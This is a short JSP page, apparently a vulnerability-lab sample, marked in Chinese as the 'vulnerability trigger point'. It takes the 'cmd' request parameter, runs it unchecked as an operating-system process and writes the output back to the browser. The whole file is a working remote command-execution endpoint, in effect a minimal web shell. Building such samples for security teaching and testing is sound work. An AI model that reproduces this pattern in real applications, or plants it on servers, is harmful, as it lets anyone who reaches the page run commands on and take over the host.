<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    // 漏洞触发点
    String cmd = request.getParameter("cmd");
    InputStream in = new ProcessBuilder(cmd).start().getInputStream();

    ByteArrayOutputStream results = new ByteArrayOutputStream();

    int l = -1;
    byte[] b = new byte[1024];
    while ((l = in.read(b)) != -1) {
        results.write(b, 0, l);
    }

    out.println(results);
%>